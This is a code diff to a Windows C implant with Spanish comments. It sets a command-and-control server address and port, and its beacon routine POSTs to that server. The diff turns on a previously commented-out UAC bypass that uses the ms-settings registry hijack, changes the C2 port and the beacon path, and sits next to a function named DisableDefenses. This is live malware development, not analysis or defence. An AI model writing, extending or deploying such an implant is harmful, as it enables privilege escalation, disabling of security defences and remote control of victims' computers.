@@ -15,7 +15,7 @@
 
 // --- CONFIGURACIÓN ---
 #define C2_SERVER "192.168.254.146"
-#define C2_PORT 8080
+#define C2_PORT 9090
 
 // ========== BASE64 (PARA COMPATIBILIDAD CON SERVIDOR) ==========
 static const char b64_chars[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
@@ -64,8 +64,6 @@ void DisableDefenses() {
     }
 }
 
-// ========== UAC BYPASS (OPCIONAL - COMENTADO POR SEGURIDAD) ==========
-/*
 void UACBypass() {
     HKEY hKey;
     if (RegCreateKeyExA(HKEY_CURRENT_USER, "Software\\Classes\\ms-settings\\Shell\\open\\command", 
@@ -81,7 +79,6 @@ void UACBypass() {
         RegDeleteKeyA(HKEY_CURRENT_USER, "Software\\Classes\\ms-settings\\Shell\\open\\command");
     }
 }
-*/
 
 // ========== BEACON SIMPLE Y ESTABLE ==========
 void Beacon() {
@@ -101,7 +98,7 @@ void Beacon() {
         HINTERNET hConnect = InternetConnectA(hSession, C2_SERVER, C2_PORT, NULL, NULL, 
                                               INTERNET_SERVICE_HTTP, 0, 0);
         if (hConnect) {
-            HINTERNET hRequest = HttpOpenRequestA(hConnect, "POST", "/api/beacon", 
+            HINTERNET hRequest = HttpOpenRequestA(hConnect, "POST", "/", 
                                                   NULL, NULL, NULL, 
                                                   INTERNET_FLAG_NO_CACHE_WRITE | INTERNET_FLAG_RELOAD, 0);
             if (hRequest) {
